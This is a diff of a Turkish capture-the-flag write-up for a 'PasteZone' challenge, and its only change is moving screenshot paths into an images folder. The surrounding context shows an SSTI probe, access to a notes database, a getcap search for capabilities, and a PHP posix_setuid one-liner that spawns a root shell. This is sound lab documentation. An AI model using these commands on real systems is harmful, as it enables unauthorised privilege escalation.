@@ -20,7 +20,7 @@ Görevin; bu paylaşımdan sorumlu kişi ya da grupları tespit etmek, PasteZone
 #### Analiz:
 - Siteye giriş yaptığımız zaman bizi bir yasadışı haber ticareti sitesi karşılıyor. 
 
-![Site girişi](image1.png?v=1)
+![Site girişi](images/image1.png?v=1)
 
 - Biraz sörf yapınca flag postlardan birinde bizi buluyor. 
 
@@ -48,7 +48,7 @@ Görevin; bu paylaşımdan sorumlu kişi ya da grupları tespit etmek, PasteZone
 {{7*7}}
 ```
 
- ![SSTI testi](image3.png?v=1)
+ ![SSTI testi](images/image3.png?v=1)
 
 #### Silahlanma (Weaponization):
 - Şablon motorunu tespit etmek için bazı denemeler yapıldı:
@@ -104,14 +104,14 @@ Görevin; bu paylaşımdan sorumlu kişi ya da grupları tespit etmek, PasteZone
 
 #### Post-Exploitation: 
 
-![Shell erişimi](image4.png?v=1)
+![Shell erişimi](images/image4.png?v=1)
 
 - Birazda bu tarafda sörf yaptık ve bir pastezone.db'ye eriştik.
 - DB içerisinde tek bir tablo var. Kolon bilgilerini yazdırdığımız zaman 
 
-![DB tablosu](image5.png?v=1) 
+![DB tablosu](images/image5.png?v=1) 
 
-![DB şeması](image6.png?v=1)
+![DB şeması](images/image6.png?v=1)
 
 Komutlar:
 ```
@@ -143,7 +143,7 @@ CREATE TABLE notes (
 getcap -r / 2>/dev/null
 ```
 
- ![Getcap çıktısı](image7.png?v=1)
+ ![Getcap çıktısı](images/image7.png?v=1)
 
 - Çıktıdan bakınca zafiyetimiz anlaşılıyor ve komutuyla root oluyoruz.
 
@@ -151,7 +151,7 @@ getcap -r / 2>/dev/null
 php8.4 -r "posix_setuid(0); system('/bin/bash');"
 ``` 
 
-![Root erişimi](image8.png?v=1)
+![Root erişimi](images/image8.png?v=1)
 
 
 ```
@@ -168,7 +168,7 @@ root
 
 - Bu noktadan sonra arama tarama başladı ve root dizininde bilgi aramaya başladık.
 
- ![Root dizini](image9.png?v=1)
+ ![Root dizini](images/image9.png?v=1)
 
 ```
 cd root
